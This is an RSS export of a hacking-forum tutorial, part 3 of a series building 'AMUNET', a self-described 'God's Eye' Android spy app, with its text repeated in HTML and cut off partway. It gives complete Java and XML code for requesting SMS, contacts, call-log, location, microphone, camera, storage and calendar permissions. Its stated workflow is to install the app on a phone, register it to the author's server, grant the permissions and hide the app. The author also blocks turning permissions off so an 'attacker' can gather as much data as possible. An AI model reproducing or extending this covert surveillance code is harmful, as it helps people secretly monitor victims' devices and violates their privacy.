<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Building a God’s Eye Android App: Part 3 - Permission Granting</title>
    <link>https://0x00sec.org/t/building-a-god-s-eye-android-app-part-3-permission-granting/7317</link>
    <description>Greetings my fellow hackers,

As we continue with our series, the **AMUNET** app becomes complicated with new functionalities and structures to understand. We’ll sail right through. As stated earlier in previous tutorials, the app doesn’t fully exists because I build them before I share so forgive me if it takes sometime before a tutorial comes out. I need to make sure everything works well first.

**PREVIOUS TUTORIALS**

Below are the tutorials covered so far.

1. [Introduction to Amunet](https://0x00sec.org/t/building-a-gods-eye-android-app-part-0-introduction-to-amunet/7112/4)
2. [Get Installed Apps](https://0x00sec.org/t/building-a-god-s-eye-android-app-part-1-collecting-installed-android-apps/7121)
3. [Sending Information to Web Server](https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168)

**TODAY’S TUTORIAL**

In today&#39;s tutorial, we are going to grant ourselves permission to the various functionalities of the android operating system. 

**RUNTIME REQUESTS ( ANDROID 6.0 AND HIGHER - DEVELOPER.ANDROID.COM )**

If the device is running Android 6.0 (API level 23) or higher, and the app&#39;s **targetSdkVersion** is 23 or higher, the user isn&#39;t notified of any app permissions at install time. Your app must ask the user to grant the dangerous permissions at runtime. When your app requests permission, the user sees a system dialog (as shown in figure 1, left) telling the user which permission group your app is trying to access. The dialog includes a Deny and Allow button.

If the user denies the permission request, the next time your app requests the permission, the dialog contains a checkbox that, when checked, indicates the user doesn&#39;t want to be prompted for the permission again (see figure 2, right).

&lt;img src=&#39;//0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/0/095bfb090ee222121b5277c691a7410b1d85b322.png&#39;&gt;

If the user checks the Never ask again box and taps Deny, the system no longer prompts the user if you later attempt to requests the same permission.

**INSTALL TIME REQUESTS ( ANDROID 5.1.1 AND BELOW )**

If the device is running Android 5.1.1 (API level 22) or lower, or the app&#39;s **targetSdkVersion** is 22 or lower while running on any version of Android, the system automatically asks the user to grant all dangerous permissions for your app at install-time (see figure 2).

&lt;img src=&#39;//0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/4/4fd4516fa037c48cd984db45f80ba42e166e4db5.png&#39;&gt;

If the user clicks Accept, all permissions the app requests are granted. If the user denies the permissions request, the system cancels the installation of the app.

The purpose of a permission is to protect the privacy of an Android user. Android apps must request permission to access sensitive user data (such as contacts and SMS), as well as certain system features (such as camera and internet). Depending on the feature, the system might grant the permission automatically or might prompt the user to approve the request.

The tutorials to follow will need access to certain permissions as they are not granted by default. We need to request them now. In this tutorial, I will take the simplest approach ( to me ) to ask for all the permissions I can think about. You should add any permission ( aside Device Admin and Boot Startup - for later ). This tutorial follows after the registration tutorial so make sure you are following sequentially.

From the previous tutorial, if you used my test server, you should have your phone information displayed.

![04|690x422](upload://5FaLYSJy1DAcHOBb5IQV3JC0Dur.png)

We have only sent information about installed apps to the server so that&#39;s what we&#39;ve got now. As we progress, the pages will be added. The counters for the other features like Browser History, Storage are zero because we&#39;ve not accessed them yet ( Permissions needed ).

**AT THE END OF THE TUTORIAL**

This will be the final result of our interface

![pic|281x500](upload://dlBQtnWEMGODz2n4KYszbZcCBvP.jpg)

We might write codes for every permission but if you don&#39;t grant them during installation. The functions under those permissions won&#39;t work. So let&#39;s recap the whole process.

1. First, install the app
2. Register the phone to your amunet cloud account ( That is, if you are using my test server )
3. Allow the permissions
4. Hide the app and done.

This process can take like 5 - 10 minutes depending on how fast you are.

Let&#39;s begin.

**INTERFACE FOR DASHBOARD**

We now have two activities ( UI Interfaces ) for our app: `MainActivity` and `Dashboard` respectively. They are both **BASIC ACTIVITY** layouts, created in the previous tutorials. For every basic activity created, two layout files are generated: `activity_(layout_name)` and `content_(layout_name)` which in our case is `activity_dashboard` and `content_dashboard` ( Dashboard UI ). We will create our UI in the `content_dashboard` file. Let&#39;s head over to the file and code.

We won&#39;t add any element or UI object but one. Guess the element ( Its a View element ) ?

It&#39;s a ....
[details=&quot;Summary&quot;]
Recycler View.
[/details]
 
Drag and drop a Recycler View from the toolbox unto the content_dashboard.xml file. You should have something similar to ...

    &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
    &lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;
    xmlns:tools=&quot;http://schemas.android.com/tools&quot;
    android:layout_width=&quot;match_parent&quot;
    android:layout_height=&quot;match_parent&quot;
    app:layout_behavior=&quot;@string/appbar_scrolling_view_behavior&quot;
    tools:context=&quot;.Dashboard&quot;
    tools:showIn=&quot;@layout/activity_dashboard&quot;&gt;

    &lt;android.support.v7.widget.RecyclerView
        android:layout_width=&quot;match_parent&quot;
        android:id=&quot;@+id/dashboard_recycler_view&quot;
        android:layout_height=&quot;wrap_content&quot; /&gt;

    &lt;/RelativeLayout&gt;

The `id` assigned to our recycler view is `dashboard_recycler_view` ( take note ). Done.

The recycler view simply holds the view and therefore needs a layout design file to populate it. It&#39;s just like a container. The layout design file are the boxes that are placed inside the container. Hope you get it. More read on RecyclerViews on [Google](https://google.com).

To create a layout design file, simply `right click` on the `layout` directory  under `res` in Android Studio and select `New` -&gt; `Layout resource file` and give it a name. For this tutorial, we will name it `recycler_items`. If you name it anything else, do well to correct it in the code otherwise your RecyclerView won&#39;t be populated ( that is, if you Android Studio compiles it ).

The layout file should be created under the `res` -&gt; `layout` directory.

**RECYCLER_ITEMS.XML**

This file will only hold one UI object. The object is a Switch ( Toggle - ON / OFF ). Every one knows a switch. A baby even does so no explanation here. By default, our toggle will be off. When we toggle it ( ON ), it asks us for the permission. This is the code.

    &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
    &lt;RelativeLayout
    xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
    android:layout_width=&quot;match_parent&quot;
    android:padding=&quot;10dp&quot;
    android:layout_height=&quot;wrap_content&quot;&gt;

    &lt;Switch
        android:layout_width=&quot;match_parent&quot;
        android:text=&quot;Permission Name&quot;
        android:id=&quot;@+id/permission_switch&quot;
        android:textOff=&quot;Denied&quot;
        android:textOn=&quot;Allowed&quot;
        android:layout_height=&quot;wrap_content&quot; /&gt;

    &lt;/RelativeLayout&gt;

Hope we are all on the same page. Easy right ?

If you&#39;ve ever worked with a recycler view, you know that it needs an adapter and list class to populate it. Read more on Google. Check out [Android Working with Recycler View](https://www.androidhive.info/2016/01/android-working-with-recycler-view/).

**CREATING A RECYCLER LIST CLASS**

We need a list that is passed to the adapter and the adapter in turn populates the recycler view with the list. Create a new java class name it `RecyclerJava`.

When it is created, you should have an empty class. Lets write our code

    String permission_name;
    String[] permission_identifier;
    int permission_request_code;

    public String getPermission_name() {
        return permission_name;
    }

    public String[] getPermission_identifier() {
        return permission_identifier;
    }

    public int getPermission_request_code() {
        return permission_request_code;
    }

    public RecyclerJava(String permission_name, String[] permission_identifier, int permission_request_code) {
        this.permission_identifier = permission_identifier;
        this.permission_name = permission_name;
        this.permission_request_code = permission_request_code;
    }

Before I explain the codes, lets first understand the logic.

The switch object we created earlier ( `recycler_items.xml` ) will need a text showing what it stands for, permission it should request when toggled and the permission request code. 

In Android, to request a permission, we need a request code. The Request code help us identify the permission later on and determine if it was granted or denied.

1. `String permission_name` - The text that is displayed on the Switch object eg Camera, Contacts.
2. `String[] permission_identifier` - Some phone functionalities ( like CAMERA, MIC, VIBRATION ) need only one permission whilst other functionalities ( like GPS, CALENDAR) need multiple permission requests. The string array allows both scenarios to be satisfied.
3. `int permission_request_code` - Request codes helps us determine if the permission was granted or not.
4. The remaining 3 functions below the above are getters.
5. The last function is a constructor that takes data from the user and updates the Class.

**CREATING A RECYCLER ADAPTER CLASS**

Recycler adapter classes are quite tricky and a personal choice depending on how you want to achieve your goal. I always have difficulty with adapter classes but managed to push through for this tutorial. It should work for our series.

What the adapter does is, it takes the list objects from the `RecyclerJava` class passed to it, finds the switch object in `recycler_items.xml` and makes sure the codes within the adapter for a particular view or object are executed. You&#39;ll understand more as we go on. Create a new java class name it `RecyclerAdapter`.

When it is created, you should have an empty class. Lets write our code.

    package &lt;package name goes here&gt;

    import android.content.Context;
    import android.content.pm.PackageManager;
    import android.support.v4.app.ActivityCompat;
    import android.support.v7.widget.RecyclerView;
    import android.view.LayoutInflater;
    import android.view.View;
    import android.view.ViewGroup;
    import android.widget.CompoundButton;
    import android.widget.Switch;
    import android.widget.Toast;

    import java.util.List;

    public class RecyclerAdapter extends RecyclerView.Adapter&lt;RecyclerAdapter.MyViewHolder&gt; {

    private List&lt;RecyclerJava&gt; recyclerJava;

    public class MyViewHolder extends RecyclerView.ViewHolder {

        Switch aSwitch;
        Context context;

        private String[] permission_identifier;
        private int permission_request_code;

        public MyViewHolder(View view) {
            super(view);
            context = view.getContext();

            aSwitch = view.findViewById(R.id.permission_switch);
            aSwitch.setChecked(false);
        }
    }

    public RecyclerAdapter(List&lt;RecyclerJava&gt; recyclerList) {
        this.recyclerJava = recyclerList;
    }

    @Override
    public MyViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {
        View itemView = LayoutInflater.from(parent.getContext())
                .inflate(R.layout.recycler_items, parent, false);

        return new MyViewHolder(itemView);
    }

    @Override
    public void onBindViewHolder(final MyViewHolder holder, int position) {
        RecyclerJava data = recyclerJava.get(position);

        String permission_name = data.getPermission_name();
        holder.permission_identifier = data.getPermission_identifier();
        holder.permission_request_code = data.getPermission_request_code();

        holder.aSwitch.setText(permission_name.toUpperCase());

        if(ActivityCompat.checkSelfPermission(holder.context, holder.permission_identifier[0]) != PackageManager.PERMISSION_GRANTED) {
            holder.aSwitch.setChecked(false);
        } else {
            holder.aSwitch.setChecked(true);
        }

        holder.aSwitch.setOnCheckedChangeListener( new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton compoundButton, boolean b) {

                if(b) {
                    ((Dashboard)holder.context).PermissionRequestHandler(holder.permission_identifier, holder.permission_request_code);
                } else {
                    holder.aSwitch.setChecked(true);
                    Toast.makeText(holder.context, &quot;Action Not Permitted&quot;, Toast.LENGTH_LONG).show();
                }
            }
        });

        holder.setIsRecyclable(false);
    }

    @Override
    public int getItemCount() {
        return recyclerJava.size();
    }

    }

Lets take it bit by bit.

1 - In the `onCreateViewHolder` method ( prolly line 43 ), the method takes the `recycler_items.xml` layout file and populates it into the `recyclerview`. The layout file holds sub views which is accessed by the `adapter` class. 

If you try accessing any other view outside the ones specified in the defined layout file, prepare yourself for a crash landing course with Android Studio. You won&#39;t make it far. :rofl:.

2 - Within the `MyViewHolder` sub class `public class MyViewHolder extends RecyclerView.ViewHolder {`, we need to get a reference to our ui objects before we can access them. Don&#39;t do long running codes in this method ( in my experience ).

3 - Every method needs a constructor ( I think ) and so does our adapter class. In `public RecyclerAdapter(List&lt;RecyclerJava&gt; recyclerList) {`, we accept a list argument ( parameter ). Through this constructor, we can take our list and populate our view with it.

4 - Last but one
* The method `public void onBindViewHolder(final MyViewHolder holder, int position) {` allows us to assign the data from the list to the ui objects in the passed layout file (  `onCreateViewHolder` method ).

* In this method, the views from the layout files are accessed through the `holder` variable. We get the data from the list through the `getters` we added in the `RecyclerJava` class created earlier.

* We check if the permission array passed to the adapter has already granted or denied, the appropriate actions are executed. 

* If permission is already granted, the switch is toggled on, when it&#39;s not, it&#39;s toggled off. As a hacker or attacker, you won&#39;t need to turn a permission off because you would want to gather as much information as you could so I therefore disabled the toggling off permissions.

* If a permission hasn&#39;t been granted ( maybe first time install ), we call a `PermissionRequestHandler` method from the DashBoard.java file ( discussed later ) when the switch is toggled on.

* The `PermissionRequestHandler` method takes two parameter: the ` permission identifier` ( string array) and the `permission request code`.

5 - The last method `public int getItemCount() {` is important. It returns the size of the list items passed to the adapter.

Lets now head over to the `Dashboard.java` file and finish what we started.

**DASHBOARD.JAVA**

In this method, we tie up the knot and marry our activities and classes together. 

We first need to declare the permission request codes below our `public class` declaration. We also declare our `RecyclerJava` list class and `RecyclerAdapter` class in this section.

    public class Dashboard extends AppCompatActivity {

    private RecyclerView recyclerView;
    private List&lt;RecyclerJava&gt; recyclerJavaList = new ArrayList&lt;&gt;();
    private RecyclerAdapter recyclerAdapter;

    protected static final int GPS_REQUEST_CODE = 5000;
    protected static final int CONTACTS_REQUEST_CODE = 5001;
    protected static final int CALENDAR_REQUEST_CODE = 5002;
    protected static final int MIC_REQUEST_CODE = 5003;
    protected static final int CAMERA_REQUEST_CODE = 5004;
    protected static final int STORAGE_REQUEST_CODE = 5005;
    protected static final int SMS_REQUEST_CODE = 5006;
    protected static final int GET_ACCOUNTS_REQUEST_CODE = 5007;

With that out of the way, let&#39;s go on write the `PermissionRequestHandler` method declared in `RecyclerAdapter` class. The method takes the string array containing the various permissions needed and the appropriate request code.

    protected void PermissionRequestHandler(String[] permission_identifier, int RequestCode) {
        if(ActivityCompat.checkSelfPermission(getApplicationContext(), permission_identifier[0]) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(Dashboard.this, permission_identifier, RequestCode);
        }
    }

Whenever a permission is requested in android, the result is not received in the calling method but instead is received in another method ( like a callback ). The callback method is `onRequestPermissionsResult`.

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        switch (requestCode) {
            case GPS_REQUEST_CODE: {
                if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(getApplicationContext(), &quot;GPS Permission Denied&quot;, Toast.LENGTH_LONG).show();
                }
                updateRecycler();
            }
            case SMS_REQUEST_CODE: {
                if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(getApplicationContext(), &quot;SMS Permission Denied&quot;, Toast.LENGTH_LONG).show();
                }
                updateRecycler();
            }
            case GET_ACCOUNTS_REQUEST_CODE: {
                if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(getApplicationContext(), &quot;Phone Accounts Access Permission Denied&quot;, Toast.LENGTH_LONG).show();
                }
                updateRecycler();
            }
            case CAMERA_REQUEST_CODE: {
                if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(getApplicationContext(), &quot;CAMERA Permission Denied&quot;, Toast.LENGTH_LONG).show();
                }
                updateRecycler();
            }
            case CALENDAR_REQUEST_CODE: {
                if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(getApplicationContext(), &quot;CALENDAR Permission Denied&quot;, Toast.LENGTH_LONG).show();
                }
                updateRecycler();
            }
            case MIC_REQUEST_CODE: {
                if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(getApplicationContext(), &quot;MIC Permission Denied&quot;, Toast.LENGTH_LONG).show();
                }
                updateRecycler();
            }
            case CONTACTS_REQUEST_CODE: {
                if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(getApplicationContext(), &quot;CONTACTS Permission Denied&quot;, Toast.LENGTH_LONG).show();
                }
                updateRecycler();
            }
            case STORAGE_REQUEST_CODE: {
                if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(getApplicationContext(), &quot;STORAGE Permission Denied&quot;, Toast.LENGTH_LONG).show();
                }
                updateRecycler();
            }
        }
    }

A new method ( `updateRecycler()` ) is introduced in the method above. The `updateRecycler()` is the method where all the hard work of this tutorial is tied into. The method passes the information to the adapter which in turn populates the recyclerview. Let&#39;s dive right into it.

    private void updateRecycler() {

        recyclerJavaList.clear();

        RecyclerJava sms_permission = new RecyclerJava(&quot;SMS&quot;,
                new String[] {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS}, SMS_REQUEST_CODE);
        recyclerJavaList.add(sms_permission);

        RecyclerJava accounts_permission = new RecyclerJava(&quot;ACCOUNTS&quot;,
                new String[] {Manifest.permission.GET_ACCOUNTS}, GET_ACCOUNTS_REQUEST_CODE);
        recyclerJavaList.add(accounts_permission);

        RecyclerJava camera_permission = new RecyclerJava(&quot;Camera&quot;,
                new String[] {Manifest.permission.CAMERA}, CAMERA_REQUEST_CODE);
        recyclerJavaList.add(camera_permission);

        RecyclerJava filesystem_permission = new RecyclerJava(&quot;Storage&quot;,
                new String[] {Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, STORAGE_REQUEST_CODE);
        recyclerJavaList.add(filesystem_permission);

        RecyclerJava calendar_permission = new RecyclerJava(&quot;Calendar&quot;,
                new String[] {Manifest.permission.READ_CALENDAR, Manifest.permission.WRITE_CALENDAR}, CALENDAR_REQUEST_CODE);
        recyclerJavaList.add(calendar_permission);

        RecyclerJava gps_permission = new RecyclerJava(&quot;GPS Location&quot;,
                new String[] {Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION}, GPS_REQUEST_CODE);
        recyclerJavaList.add(gps_permission);

        RecyclerJava mic_permission = new RecyclerJava(&quot;Record Microphone&quot;,
                new String[] {Manifest.permission.RECORD_AUDIO}, MIC_REQUEST_CODE);
        recyclerJavaList.add(mic_permission);

        RecyclerJava contact_permission = new RecyclerJava(&quot;Contacts &amp; Call Logs&quot;,
                new String[] {Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS, Manifest.permission.PROCESS_OUTGOING_CALLS}, CONTACTS_REQUEST_CODE);
        recyclerJavaList.add(contact_permission);

        recyclerAdapter = new RecyclerAdapter(recyclerJavaList);
        recyclerView.setAdapter(recyclerAdapter);
        recyclerAdapter.notifyDataSetChanged();
    }

The method creates a list and passes it to the adapter. Notice that some functionalities have double permissions whilst others only need one.

We need to however call this method from the `onCreate` method.

**ONCREATE METHOD**

In the `onCreate`, we set references ( recyclerview, adapter ) and call the needed functions ( updateRecycler ).

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_dashboard);
        Toolbar toolbar = findViewById(R.id.dashboard_toolbar);
        setSupportActionBar(toolbar);

        recyclerView = findViewById(R.id.dashboard_recycler_view);

        recyclerAdapter = new RecyclerAdapter(recyclerJavaList);
        RecyclerView.LayoutManager mLayoutManager = new LinearLayoutManager(getApplicationContext());
        recyclerView.setLayoutManager(mLayoutManager);
        recyclerView.setItemAnimator(new DefaultItemAnimator());
        recyclerView.addItemDecoration(new DividerItemDecoration(Dashboard.this, LinearLayoutManager.VERTICAL));

        updateRecycler();
    }

**THE IMPORT STATEMENT**

Incase you are having trouble with your import statements, these are the complete import statements

    import android.Manifest;
    import android.content.pm.PackageManager;
    import android.os.Bundle;
    import android.support.annotation.NonNull;
    import android.support.v4.app.ActivityCompat;
    import android.support.v7.app.AppCompatActivity;
    import android.support.v7.widget.DefaultItemAnimator;
    import android.support.v7.widget.DividerItemDecoration;
    import android.support.v7.widget.LinearLayoutManager;
    import android.support.v7.widget.RecyclerView;
    import android.support.v7.widget.Toolbar;
    import android.widget.Toast;
    import java.util.ArrayList;
    import java.util.List;

**ANDROID MANIFEST**

You can have all permissions coded but if you don&#39;t specify them in the `AndroidManifest.xml` file, it won&#39;t be processed when requested. This is the complete AndroidManifest file.

    &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
    &lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
    package=&quot;org.a0x00sec.amunet&quot;&gt;

    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.PROCESS_OUTGOING_CALLS&quot; /&gt;

    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot; /&gt;

    &lt;uses-permission android:name=&quot;android.permission.ACCESS_FINE_LOCATION&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.ACCESS_COARSE_LOCATION&quot; /&gt;

    &lt;uses-permission android:name=&quot;android.permission.READ_CONTACTS&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.WRITE_CONTACTS&quot; /&gt;

    &lt;uses-permission android:name=&quot;android.permission.CAMERA&quot; /&gt;

    &lt;uses-permission android:name=&quot;android.permission.VIBRATE&quot; /&gt;

    &lt;uses-permission android:name=&quot;android.permission.READ_EXTERNAL_STORAGE&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt;
    
    &lt;uses-permission android:name=&quot;android.permission.READ_SMS&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.WRITE_SMS&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_SMS&quot; /&gt;

    &lt;uses-permission android:name=&quot;android.permission.RECORD_AUDIO&quot; /&gt;

    &lt;uses-permission android:name=&quot;com.android.browser.permission.READ_HISTORY_BOOKMARKS&quot; /&gt;

    &lt;uses-permission android:name=&quot;android.permission.READ_CALENDAR&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.WRITE_CALENDAR&quot; /&gt;

    &lt;application
        android:allowBackup=&quot;true&quot;
        android:icon=&quot;@mipmap/godseye&quot;
        android:label=&quot;@string/app_name&quot;
        android:roundIcon=&quot;@mipmap/godseye&quot;
        android:supportsRtl=&quot;true&quot;
        android:theme=&quot;@style/AppTheme&quot;&gt;

        &lt;activity
            android:name=&quot;.MainActivity&quot;
            android:label=&quot;@string/app_name&quot;
            android:theme=&quot;@style/AppTheme.NoActionBar&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;

                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;
            &lt;/intent-filter&gt;
        &lt;/activity&gt;

        &lt;activity
            android:name=&quot;.Dashboard&quot;
            android:label=&quot;@string/title_activity_dashboard&quot;
            android:theme=&quot;@style/AppTheme.NoActionBar&quot; /&gt;

    &lt;/application&gt;

    &lt;/manifest&gt;

The only changes are the `permissions` above the `application` tag.

**HOUSE KEEPING**

In the previous tutorial ( `MainActivity.java` ), under `create_phone_account`, we placed this line of code  `progressDialog.dismiss();` exactly under `public void onResponse(String req) {`.

It will still work but will led the user to exit the app after the registration is complete. That is the idea but if you followed from previous tutorials, we added threads to run once the registration is done. This thread will therefore be cancelled. Instead of putting the dismiss code before the CountdownTimer, we place it after it. The `onResponse` section of the `create_phone_account` method will look like this.

    public void onResponse(String req) {
                // progressDialog.dismiss();

                try {

                    final JSONObject response = new JSONObject(req);

                    if(response.getBoolean(&quot;success&quot;)) {
                        final String server_response = response.getString(&quot;response&quot;);

                        SharedPreferences.Editor editor = sharedPreferences.edit();

                        editor.putString(&quot;auth_key&quot;, response.getString(&quot;api_key&quot;));

                        editor.apply();

                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                collect_phone_details();
                                collect_installed_apps();
                            }
                        }).start();

                        new CountDownTimer(6000,1000) {
                            @Override
                            public void onTick(long l) {

                            }

                            @Override
                            public void onFinish() {
                                show_alert(server_response);
                            }
                        }.start();

                        username.setText(&quot;&quot;);
                        password.setText(&quot;&quot;);
                        name.setText(&quot;&quot;);

                        progressDialog.dismiss(); // New line of code
                        startActivity(new Intent(MainActivity.this, Dashboard.class));
                        finish();
                    } else {
                        show_alert(response.getString(&quot;response&quot;));
                    }
                } catch (Exception e) {
                    show_alert(&quot;Authentication error: &quot; + e.getMessage());
                }
            }

That should be the end of this tutorial. You can run your app.

**CONCLUSION**

I would love your contributions, suggestions, feedbacks, critics, etc. Anything to help the series.

You can directly import the project into your android studio if you are having trouble.

Checkout the github repo: https://github.com/sergeantexploiter/Amunet

Until we meet again. I’m out.

**#Sergeant**</description>
    
    <lastBuildDate>Fri, 29 Jun 2018 14:57:46 +0000</lastBuildDate>
    <category>Phone Hacking</category>
    <atom:link href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-3-permission-granting/7317.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Building a God’s Eye Android App: Part 3 - Permission Granting</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-3-permission-granting/7317/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/building-a-god-s-eye-android-app-part-3-permission-granting/7317/2</link>
        <pubDate>Sun, 29 Jul 2018 14:43:41 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7317-2</guid>
        <source url="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-3-permission-granting/7317.rss">Building a God’s Eye Android App: Part 3 - Permission Granting</source>
      </item>
      <item>
        <title>Building a God’s Eye Android App: Part 3 - Permission Granting</title>
        <dc:creator><![CDATA[sergeantsploit]]></dc:creator>
        <description><![CDATA[
            <p>Greetings my fellow hackers,</p>
<p>As we continue with our series, the <strong>AMUNET</strong> app becomes complicated with new functionalities and structures to understand. We’ll sail right through. As stated earlier in previous tutorials, the app doesn’t fully exists because I build them before I share so forgive me if it takes sometime before a tutorial comes out. I need to make sure everything works well first.</p>
<p><strong>PREVIOUS TUTORIALS</strong></p>
<p>Below are the tutorials covered so far.</p>
<ol>
<li><a href="https://0x00sec.org/t/building-a-gods-eye-android-app-part-0-introduction-to-amunet/7112/4">Introduction to Amunet</a></li>
<li><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-1-collecting-installed-android-apps/7121">Get Installed Apps</a></li>
<li><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168">Sending Information to Web Server</a></li>
</ol>
<p><strong>TODAY’S TUTORIAL</strong></p>
<p>In today’s tutorial, we are going to grant ourselves permission to the various functionalities of the android operating system.</p>
<p><strong>RUNTIME REQUESTS ( ANDROID 6.0 AND HIGHER - <a href="http://DEVELOPER.ANDROID.COM" rel="noopener nofollow ugc">DEVELOPER.ANDROID.COM</a> )</strong></p>
<p>If the device is running Android 6.0 (API level 23) or higher, and the app’s <strong>targetSdkVersion</strong> is 23 or higher, the user isn’t notified of any app permissions at install time. Your app must ask the user to grant the dangerous permissions at runtime. When your app requests permission, the user sees a system dialog (as shown in figure 1, left) telling the user which permission group your app is trying to access. The dialog includes a Deny and Allow button.</p>
<p>If the user denies the permission request, the next time your app requests the permission, the dialog contains a checkbox that, when checked, indicates the user doesn’t want to be prompted for the permission again (see figure 2, right).</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/095bfb090ee222121b5277c691a7410b1d85b322.png" width="" height=""></p>
<p>If the user checks the Never ask again box and taps Deny, the system no longer prompts the user if you later attempt to requests the same permission.</p>
<p><strong>INSTALL TIME REQUESTS ( ANDROID 5.1.1 AND BELOW )</strong></p>
<p>If the device is running Android 5.1.1 (API level 22) or lower, or the app’s <strong>targetSdkVersion</strong> is 22 or lower while running on any version of Android, the system automatically asks the user to grant all dangerous permissions for your app at install-time (see figure 2).</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4fd4516fa037c48cd984db45f80ba42e166e4db5.png" width="" height=""></p>
<p>If the user clicks Accept, all permissions the app requests are granted. If the user denies the permissions request, the system cancels the installation of the app.</p>
<p>The purpose of a permission is to protect the privacy of an Android user. Android apps must request permission to access sensitive user data (such as contacts and SMS), as well as certain system features (such as camera and internet). Depending on the feature, the system might grant the permission automatically or might prompt the user to approve the request.</p>
<p>The tutorials to follow will need access to certain permissions as they are not granted by default. We need to request them now. In this tutorial, I will take the simplest approach ( to me ) to ask for all the permissions I can think about. You should add any permission ( aside Device Admin and Boot Startup - for later ). This tutorial follows after the registration tutorial so make sure you are following sequentially.</p>
<p>From the previous tutorial, if you used my test server, you should have your phone information displayed.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/2/27b25e5019d4515b3533cadb81f4ff160ae14dfb.png" alt="04" data-base62-sha1="5FaLYSJy1DAcHOBb5IQV3JC0Dur" width="690" height="422"></p>
<p>We have only sent information about installed apps to the server so that’s what we’ve got now. As we progress, the pages will be added. The counters for the other features like Browser History, Storage are zero because we’ve not accessed them yet ( Permissions needed ).</p>
<p><strong>AT THE END OF THE TUTORIAL</strong></p>
<p>This will be the final result of our interface</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/5/5d8da15deb8d8a2e1c083a87e92a4ff57ceb9e79.jpg" alt="pic" data-base62-sha1="dlBQtnWEMGODz2n4KYszbZcCBvP" width="281" height="500"></p>
<p>We might write codes for every permission but if you don’t grant them during installation. The functions under those permissions won’t work. So let’s recap the whole process.</p>
<ol>
<li>First, install the app</li>
<li>Register the phone to your amunet cloud account ( That is, if you are using my test server )</li>
<li>Allow the permissions</li>
<li>Hide the app and done.</li>
</ol>
<p>This process can take like 5 - 10 minutes depending on how fast you are.</p>
<p>Let’s begin.</p>
<p><strong>INTERFACE FOR DASHBOARD</strong></p>
